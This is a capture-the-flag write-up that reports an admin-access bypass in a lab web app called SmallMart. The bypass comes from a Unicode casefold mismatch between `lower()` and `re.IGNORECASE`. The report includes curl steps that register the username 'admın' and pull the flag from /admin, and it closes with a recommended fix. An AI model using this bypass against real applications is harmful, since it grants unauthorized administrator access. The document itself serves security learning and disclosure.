# SmallMart - Admin Access Bypass via Unicode Casefold Mismatch

## Summary
SmallMart uses inconsistent case handling between registration and admin checks. The registration logic compares `username.lower()` to `"admin"`, while the admin gate uses `re.IGNORECASE`. This mismatch allows Unicode variants of "admin" to bypass registration checks and still pass the admin gate, resulting in admin access and flag disclosure.

## Scope
- Target: https://2cat0a0mm8d8.ctfhub.io
- Platform: HackingHub
- Challenge: SmallMart

## Vulnerability Type
- Authentication bypass / Privilege escalation
- Root cause: Unicode casefold mismatch across validation paths

## Root Cause
From the provided source code:
- Registration blocks only `username.lower() == "admin"`
- Admin gate uses `re.match(r"^admin$", name, flags=re.IGNORECASE)`

`lower()` and `re.IGNORECASE` handle Unicode differently. Certain Unicode characters (e.g., U+0130 and U+0131) bypass the registration check but still match the admin regex.

## Impact
An attacker can register a username that is not blocked during registration yet still passes the admin gate, gaining unauthorized access to `/admin` and retrieving the flag.

## Steps to Reproduce
All commands can be run in HackBox or any terminal with `curl`.

1) Set target and password:
```bash
TARGET="https://2cat0a0mm8d8.ctfhub.io"
PASS="test123"
```

2) Register and login with Unicode username U+0131 (dotless i):
```bash
USER=$(printf 'adm\u0131n')

curl -s -L -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/register" >/dev/null

curl -s -L -c /tmp/c.txt -X POST \
  -d "username=$USER&password=$PASS" \
  "$TARGET/login" >/dev/null
```

3) Access admin and extract flag:
```bash
curl -s -b /tmp/c.txt "$TARGET/admin" | grep -oE "flag\{[^}]+\}"
```

Expected result: HTTP 200 from `/admin` and the flag in the response.

## Why It Works
- Registration uses `lower()` which does not normalize some Unicode characters to ASCII `i`.
- The admin check uses `re.IGNORECASE`, which treats some Unicode variants as case-equivalent to `i`.
- The mismatch allows a username that is not blocked at registration to be treated as admin at authorization.

## Recommended Fix
- Normalize usernames consistently across all checks (e.g., `casefold()` plus Unicode normalization), or
- Use strict, consistent case-sensitive checks for both registration and admin gate.

## Proof of Exploit
Include the command output showing HTTP 200 or the extracted flag.
